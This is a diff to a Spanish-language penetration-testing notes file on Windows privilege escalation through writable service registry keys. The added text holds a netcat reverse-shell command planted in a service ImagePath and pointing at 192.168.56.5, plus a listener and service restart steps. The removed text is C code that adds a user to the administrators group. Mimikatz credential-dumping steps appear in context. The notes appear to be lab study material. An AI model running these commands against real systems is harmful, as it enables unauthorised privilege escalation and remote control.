@@ -1884,115 +1884,44 @@ icacls C:\Users\[Usuario]\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\
 
 Si alguno de los archivos se puede escribir, se puede sobrescribir con una reverse shell o algun otro payload que nos permita escalar privilegios.
 
-##### Sericios Get-Acl hklm:\System\CurrentControlSet\services\regsvc
+##### ACL de registro permisivas
 
 Si una cuenta de usuario puede registrar servicios, entonces podemos crear un servicios malicioso para realizar una tarea privilegiada.
 
-El código que utilizaremo es el siguiente:
+```powershell
+PS C:\> accesschk.exe /accepteula "user" -kvuqsw hklm\System\CurrentControlSet\services
 
-```c
-#include <windows.h>  
-#include <stdio.h>  
-  
-#define SLEEP_TIME 5000  
-  
-SERVICE_STATUS ServiceStatus;    
-SERVICE_STATUS_HANDLE hStatus;    
-   
-void ServiceMain(int argc, char** argv);    
-void ControlHandler(DWORD request);    
-  
-//add the payload here  
-int Run()    
-{    
-   system("cmd.exe /k net localgroup administrators user /add");
-   return 0;    
-}    
-  
-int main()    
-{    
-   SERVICE_TABLE_ENTRY ServiceTable[2];  
-   ServiceTable[0].lpServiceName = "MyService";  
-   ServiceTable[0].lpServiceProc = (LPSERVICE_MAIN_FUNCTION)ServiceMain;  
-  
-   ServiceTable[1].lpServiceName = NULL;  
-   ServiceTable[1].lpServiceProc = NULL;  
-   
-   StartServiceCtrlDispatcher(ServiceTable);     
-   return 0;  
-}  
-  
-void ServiceMain(int argc, char** argv)    
-{    
-   ServiceStatus.dwServiceType        = SERVICE_WIN32;    
-   ServiceStatus.dwCurrentState       = SERVICE_START_PENDING;    
-   ServiceStatus.dwControlsAccepted   = SERVICE_ACCEPT_STOP | SERVICE_ACCEPT_SHUTDOWN  
-;  
-   ServiceStatus.dwWin32ExitCode      = 0;    
-   ServiceStatus.dwServiceSpecificExitCode = 0;    
-   ServiceStatus.dwCheckPoint         = 0;    
-   ServiceStatus.dwWaitHint           = 0;    
-   
-   hStatus = RegisterServiceCtrlHandler("MyService", (LPHANDLER_FUNCTION)ControlHandl  
-er);    
-   Run();    
-      
-   ServiceStatus.dwCurrentState = SERVICE_RUNNING;    
-   SetServiceStatus (hStatus, &ServiceStatus);  
-   
-   while (ServiceStatus.dwCurrentState == SERVICE_RUNNING)  
-   {  
-               Sleep(SLEEP_TIME);  
-   }  
-   return;    
-}  
-  
-void ControlHandler(DWORD request)    
-{    
-   switch(request)    
-   {    
-       case SERVICE_CONTROL_STOP:    
-                       ServiceStatus.dwWin32ExitCode = 0;    
-           ServiceStatus.dwCurrentState  = SERVICE_STOPPED;    
-           SetServiceStatus (hStatus, &ServiceStatus);  
-           return;    
-   
-       case SERVICE_CONTROL_SHUTDOWN:    
-           ServiceStatus.dwWin32ExitCode = 0;    
-           ServiceStatus.dwCurrentState  = SERVICE_STOPPED;    
-           SetServiceStatus (hStatus, &ServiceStatus);  
-           return;    
-          
-       default:  
-           break;  
-   }    
-   SetServiceStatus (hStatus,  &ServiceStatus);  
-   return;    
-}
+Accesschk v6.13 - Reports effective permissions for securable objects
+Copyright ⌐ 2006-2020 Mark Russinovich
+Sysinternals - www.sysinternals.com
+
+RW HKLM\System\CurrentControlSet\services\regsvc
+        KEY_ALL_ACCESS
+
+<SNIP>
 ```
+###### Cambiar ImagePath con PowerShell
 
-En nuestra máquina atacante, compilamos el código con el siguiente comando:
+Podemos abusar de esto usando el cmdlet de PowerShell. `Set-ItemProperty` para cambiar el `ImagePath` valor, usando un comando como:
 
-```c
-x86_64-w64-mingw32-gcc windows_service.c -o privesc.exe
+```powershell-session
+PS C:\htb> Set-ItemProperty -Path HKLM:\SYSTEM\CurrentControlSet\Services\regsvc -Name "ImagePath" -Value "C:\Temp\nc.exe -e cmd.exe 192.168.56.5 4444"
 ```
-
-Transferimos el binario a la máquina víctima y registramos el servicio.
 
 ```powershell
 reg add HKLM\SYSTEM\CurrentControlSet\services\regsvc /v ImagePath /t REG_EXPAND_SZ /d [C:\Temp\privesc.exe] /f
 ```
 
-Iniciamos el servicio
-
-```powershell
-sc.exe start regsvc
+###### Iniciamos el lisetern con Netcat
+```bash
+rlwrap nc -lnvp 4444
 ```
 
-Confirmamos que el usuario se haya agregado al grupo administrators.
+###### Detemenos e Iniciamos el servicio
 
 ```powershell
-net localgroup administrators
+sc.exe stop regsvc
+sc.exe start regsvc
 ```
 
 ##### Servicios - `binPath`
@@ -2072,12 +2001,22 @@ Explicación:
 - `sekurlsa::minidump`: Carga el archivo volcado.
 - `sekurlsa::logonpasswords` Extrae credenciales del volcado.
 
+##### Event Log Readers
+##### Print Operators
+##### SeTakeOwnershipPrivilege
 
 ###  9.2. <a name='linux-2'></a>Linux
 
 ##  10. <a name='active-directory'></a>Active Directory
 
-###  10.1. <a name='enumeración-2'></a>Enumeración
+### Escalación de privilegios
+
+#### Grupos Privilegiados
+
+##### Account Operators
+##### Server Operators
+##### DnsAdmins
+##### Backup Operators
 
 ###  10.2. <a name='kerberos'></a>Kerberos
 
